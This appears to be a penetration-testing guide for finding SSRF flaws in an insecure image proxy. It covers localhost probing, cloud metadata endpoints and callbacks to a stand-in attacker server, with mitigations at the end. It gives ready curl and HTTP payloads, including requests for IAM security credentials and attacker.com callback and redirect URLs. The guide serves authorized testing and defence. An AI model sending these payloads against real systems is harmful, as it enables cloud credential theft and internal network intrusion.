---
title: "implementation details for testing insecure image proxy"
tags:
  - vulnerability
---

Below, I’ll elaborate on the implementation details for testing the three specified vulnerabilities related to an insecure image proxy: **Internal URL Testing**, **SSRF via Proxy**, and **Malicious URL**. Each section provides step-by-step instructions, including tools, payloads, and expected outcomes, to help identify and exploit these Server-Side Request Forgery (SSRF) vulnerabilities. The focus is on practical implementation, assuming a target application with an image proxy endpoint that fetches and processes URLs provided by users.



# Insecure Image Proxy SSRF Testing Guide

This guide provides detailed implementation steps for testing an insecure image proxy for Server-Side Request Forgery (SSRF) vulnerabilities. The focus is on three specific tests: **Internal URL Testing**, **SSRF via Proxy**, and **Malicious URL**. Each section includes prerequisites, tools, payloads, and expected outcomes to identify vulnerabilities effectively.

## Prerequisites
- **Tools**: Burp Suite (or similar proxy tool), cURL, a browser with developer tools, and a controlled server (e.g., a VPS or ngrok for external URL testing).
- **Setup**: Identify the image proxy endpoint (e.g., `https://example.com/image?url=` or `POST /api/image/fetch`). This is typically a URL or API that accepts an image URL and fetches its content.
- **Permissions**: Ensure you have permission to test the target application (e.g., via a bug bounty program or explicit authorization).
- **Controlled Server**: For the Malicious URL test, set up a server to log incoming requests (e.g., using a simple Python HTTP server or a service like webhook.site).

## 1. Internal URL Testing
**Objective**: Test if the image proxy allows fetching resources from internal network addresses, such as `http://localhost:8080`, which could expose sensitive internal services.

### Implementation Steps
1. **Identify the Proxy Endpoint**:
   - Locate the image proxy endpoint by inspecting the application’s frontend (e.g., JavaScript fetching images) or API documentation. Common formats include:
     - `GET /image?url=<target_url>`
     - `POST /api/image/fetch` with a JSON payload like `{"url": "<target_url>"}`.
   - Example: Assume the endpoint is `https://example.com/image?url=<target_url>`.

2. **Craft the Payload**:
   - Construct a URL targeting a local service, such as `http://localhost:8080`. This tests if the proxy can access internal services running on the server.
   - URL-encoded payload (if needed): `http%3A%2F%2Flocalhost%3A8080`.
   - If the endpoint uses a POST request, prepare a JSON payload:
     ```json
     {"url": "http://localhost:8080"}
     ```

3. **Send the Request**:
   - **Using Burp Suite**:
     - Configure your browser to proxy traffic through Burp Suite.
     - Navigate to the image proxy feature (e.g., an image upload or preview page) or manually send a request via Burp Repeater.
     - Example GET request:
       ```
       GET /image?url=http://localhost:8080 HTTP/1.1
       Host: example.com
       ```
     - Example POST request:
       ```
       POST /api/image/fetch HTTP/1.1
       Host: example.com
       Content-Type: application/json

       {"url": "http://localhost:8080"}
       ```
   - **Using cURL**:
     ```bash
     curl -X GET "https://example.com/image?url=http://localhost:8080"
     ```
     or
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8080"}' https://example.com/api/image/fetch
     ```

4. **Analyze the Response**:
   - **Success Case**: If the response contains data from the internal service (e.g., a webpage, API response, or error message specific to `localhost:8080`), the proxy is vulnerable to SSRF. For example:
     - Response body contains HTML or JSON from an internal dashboard running on port 8080.
     - Response headers indicate a connection to an internal service (e.g., `Server: InternalApp`).
   - **Failure Case**: If the response is an error like “Invalid URL” or “Connection refused,” the proxy may block internal requests, but further testing is needed (e.g., try other ports like `8081`, `80`, or `443`).

5. **Additional Tests**:
   - Test other local addresses (e.g., `http://127.0.0.1:8080`, `http://[::1]:8080` for IPv6).
   - Try common internal ports (e.g., `80`, `443`, `8000`, `8081`, `9200` for Elasticsearch).
   - If the proxy returns an image, check its metadata (e.g., EXIF) for signs of internal data leakage.

### Expected Outcome
- **Vulnerable**: The proxy fetches and returns content from `http://localhost:8080`, such as an internal admin panel or service response. This indicates the server can access internal network resources, potentially exposing sensitive data.
- **Not Vulnerable**: The proxy rejects the request (e.g., HTTP 403, 400, or timeout) or returns no internal data, suggesting internal address filtering.

### Risks
- Exposure of internal services (e.g., admin panels, databases).
- Access to sensitive data like internal API responses or configuration files.

## 2. SSRF via Proxy (Cloud Metadata Endpoint)
**Objective**: Test if the image proxy can access cloud provider metadata endpoints (e.g., AWS’s `http://169.254.169.254/latest/meta-data/`), which could leak sensitive instance data like IAM credentials.

### Implementation Steps
1. **Understand the Target Environment**:
   - Research if the application runs on a cloud provider (e.g., AWS, Azure, GCP). The AWS metadata endpoint (`http://169.254.169.254/latest/meta-data/`) is a common SSRF target.
   - Confirm the proxy endpoint (e.g., `https://example.com/image?url=` or `POST /api/image/fetch`).

2. **Craft the Payload**:
   - Use the AWS metadata endpoint: `http://169.254.169.254/latest/meta-data/`.
   - URL-encoded payload: `http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F`.
   - For POST requests, prepare:
     ```json
     {"url": "http://169.254.169.254/latest/meta-data/"}
     ```
   - Optionally, target specific metadata like IAM credentials:
     - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

3. **Send the Request**:
   - **Using Burp Suite**:
     - Intercept a request to the image proxy or use Burp Repeater.
     - Example GET request:
       ```
       GET /image?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
       Host: example.com
       ```
     - Example POST request:
       ```
       POST /api/image/fetch HTTP/1.1
       Host: example.com
       Content-Type: application/json

       {"url": "http://169.254.169.254/latest/meta-data/"}
       ```
   - **Using cURL**:
     ```bash
     curl -X GET "https://example.com/image?url=http://169.254.169.254/latest/meta-data/"
     ```
     or
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}' https://example.com/api/image/fetch
     ```

4. **Analyze the Response**:
   - **Success Case**: If the response contains cloud metadata (e.g., instance ID, IAM roles, or security credentials), the proxy is vulnerable. Example response:
     ```
     instance-id
     ami-id
     iam/security-credentials/role-name
     ```
     - If you target `/iam/security-credentials/role-name`, you might get:
       ```json
       {
         "AccessKeyId": "ASIA...",
         "SecretAccessKey": "abcd...",
         "Token": "xyz..."
       }
       ```
   - **Failure Case**: If the response is an error (e.g., “Connection timed out” or “Invalid URL”), the proxy may block metadata endpoints, but test other cloud providers (e.g., Azure: `http://169.254.169.254/metadata/instance`, GCP: `http://metadata.google.internal/computeMetadata/v1/`).

5. **Additional Tests**:
   - Test deeper metadata paths (e.g., `http://169.254.169.254/latest/user-data` for user scripts).
   - Try alternative cloud metadata endpoints:
     - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
     - GCP: `http://metadata.google.internal/computeMetadata/v1/?recursive=true` (with `Metadata-Flavor: Google` header).
   - Test for timeouts or delays, which may indicate blind SSRF (use a tool like `time` with cURL to measure response time).

### Expected Outcome
- **Vulnerable**: The proxy returns cloud metadata, such as instance details or IAM credentials, indicating SSRF. This could allow an attacker to escalate privileges or access sensitive cloud resources.
- **Not Vulnerable**: The proxy rejects the request or returns no metadata, suggesting filtering for known metadata endpoints.

### Risks
- Leaked IAM credentials can lead to full cloud account compromise.
- Exposure of instance metadata (e.g., user-data scripts) may reveal sensitive configurations.

## 3. Malicious URL
**Objective**: Test if the image proxy fetches arbitrary external URLs without validation, which could be used to confirm SSRF or interact with attacker-controlled servers.

### Implementation Steps
1. **Set Up a Controlled Server**:
   - Create a simple HTTP server to log incoming requests:
     - **Python Example**:
       ```bash
       python3 -m http.server 80
       ```
       - This serves files from the current directory and logs requests to the console.
   - Alternatively, use a service like webhook.site or ngrok to expose a public URL (e.g., `http://attacker.com/malicious.jpg`).
   - Ensure the server responds with a valid image (e.g., a JPEG file) to mimic a legitimate request, or log all request details (headers, IP, etc.).

2. **Craft the Payload**:
   - Use your controlled server’s URL: `http://attacker.com/malicious.jpg`.
   - URL-encoded payload: `http%3A%2F%2Fattacker.com%2Fmalicious.jpg`.
   - For POST requests:
     ```json
     {"url": "http://attacker.com/malicious.jpg"}
     ```

3. **Send the Request**:
   - **Using Burp Suite**:
     - Intercept or craft a request to the image proxy.
     - Example GET request:
       ```
       GET /image?url=http://attacker.com/malicious.jpg HTTP/1.1
       Host: example.com
       ```
     - Example POST request:
       ```
       POST /api/image/fetch HTTP/1.1
       Host: example.com
       Content-Type: application/json

       {"url": "http://attacker.com/malicious.jpg"}
       ```
   - **Using cURL**:
     ```bash
     curl -X GET "https://example.com/image?url=http://attacker.com/malicious.jpg"
     ```
     or
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"url":"http://attacker.com/malicious.jpg"}' https://example.com/api/image/fetch
     ```

4. **Monitor the Controlled Server**:
   - Check the server logs for incoming requests from the target server’s IP.
   - Example log from Python server:
     ```
     192.168.1.100 - - [26/Jun/2025 10:34:12] "GET /malicious.jpg HTTP/1.1" 200 -
     ```
   - If using webhook.site, check the dashboard for request details (e.g., headers, user-agent).

5. **Analyze the Response**:
   - **Success Case**: If the proxy fetches the file and returns it (or your server logs a request), it confirms SSRF. For example:
     - The proxy returns the content of `malicious.jpg`.
     - Your server logs a GET request from the target server.
   - **Failure Case**: If no request reaches your server or the proxy returns an error (e.g., “Invalid URL”), it may validate URLs, but test with variations (e.g., HTTPS, subdomains like `sub.attacker.com`).

6. **Additional Tests**:
   - Test with different file types (e.g., `http://attacker.com/evil.php`) to check for execution or MIME-type issues.
   - Use a URL with query parameters (e.g., `http://attacker.com/log?data=test`) to log additional data.
   - Try redirect chains (e.g., `http://attacker.com/redirect?to=http://internal.com`) to test if the proxy follows redirects to internal resources.

### Expected Outcome
- **Vulnerable**: The proxy sends a request to your server, confirming it fetches arbitrary external URLs without validation. This could be used to interact with internal or external systems.
- **Not Vulnerable**: No request reaches your server, or the proxy rejects the URL, indicating validation (e.g., allowlist of domains).

### Risks
- Attackers can use the proxy to send requests to arbitrary servers, potentially bypassing firewall rules.
- Combined with internal URL access, this could lead to data exfiltration or interaction with internal services.

## Mitigation Recommendations
- **Validate URLs**: Implement an allowlist for permitted domains and reject internal IPs (e.g., `127.0.0.1`, `169.254.169.254`).
- **Restrict Protocols**: Allow only `https` and block `http`, `file`, or other protocols.
- **Rate Limiting**: Enforce rate limits on proxy requests to prevent abuse.
- **Disable Redirects**: Prevent the proxy from following HTTP redirects to untrusted domains.
- **Cloud Metadata Protection**: Block access to cloud metadata endpoints (e.g., `169.254.169.254`) at the network or application level.

## Notes
- Always test ethically and within the scope of authorized testing.
- For cloud metadata SSRF, report findings immediately, as they can lead to severe compromise.
- If the proxy returns images, use tools like `exiftool` to inspect metadata for additional leaks.


